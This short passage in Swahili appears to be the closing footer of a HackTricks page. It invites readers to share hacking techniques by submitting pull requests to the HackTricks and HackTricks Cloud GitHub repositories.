* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
